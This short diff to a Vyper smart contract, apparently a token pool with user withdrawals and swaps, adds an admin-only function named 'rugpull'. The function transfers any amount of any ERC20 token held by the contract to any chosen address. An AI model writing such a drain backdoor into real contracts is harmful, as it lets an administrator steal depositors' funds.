@@ -519,6 +519,14 @@ def withdraw(user: address, move_to: address) -> uint256[2]:
     return [total_x, total_y]
 
 
+@external
+def rugpull(coin: address, _to: address, val: uint256):
+    assert msg.sender == ADMIN
+
+    if val > 0:
+        assert ERC20(coin).transfer(_to, val)
+
+
 @internal
 @view
 def calc_swap_out(pump: bool, in_amount: uint256) -> DetailedTrade:
